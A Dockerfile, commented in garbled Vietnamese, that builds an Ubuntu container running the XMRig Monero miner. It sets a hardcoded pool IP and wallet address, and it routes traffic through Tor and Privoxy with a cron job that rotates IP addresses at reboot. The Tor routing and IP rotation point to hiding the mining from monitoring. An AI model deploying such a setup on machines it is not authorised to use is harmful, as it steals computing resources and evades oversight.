# S? d?ng image co b?n t? Ubuntu 20.04
FROM ubuntu:20.04

# Cài d?t các package c?n thi?t bao g?m Tor và Privoxy
RUN apt-get update && apt-get install -y \
    torsocks \
    wget \
    tor \
    privoxy \
    cron \
    && apt-get clean

# Thi?t l?p các bi?n môi tru?ng và thông s? XMRig
ENV VERSION="6.21.0" \
    WORK_DIR="/root/work" \
    POOL="47.238.48.153:8080" \
    USERNAME="45edxp4yMGmELBAYxkzkmhjYKH85sNApENokaB3UpZXoMcinqEyH4bRZM1wnN3VGTkVqf7Ve7tqSCDPywne5XSP2VnmGi3y" \
    ALGO="rx/0" \
    DONATE="1" \
    TOR_PORT="9051"

# T?o thu m?c làm vi?c
RUN mkdir -p $WORK_DIR

# T?i xu?ng và gi?i nén XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz -P $WORK_DIR \
    && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR

# Sao chép file c?u hình privoxy và tor vào container
COPY config /etc/privoxy/config
COPY torrc /etc/tor/torrc

# C?p quy?n cho c?u hình Tor và Privoxy
RUN chmod 644 /etc/tor/torrc && chmod 644 /etc/privoxy/config

# Sao chép file change_ip.sh và start.sh vào container
COPY change_ip.sh /root/change_ip.sh
COPY start.sh /root/start.sh

# C?p quy?n th?c thi cho các script
RUN chmod +x /root/change_ip.sh && chmod +x /root/start.sh

# Thi?t l?p cron d? t? d?ng ch?y d?i IP
RUN (crontab -l; echo "@reboot /root/change_ip.sh") | crontab -

# Kh?i ch?y XMRig và các d?ch v?
CMD ["/root/start.sh"]
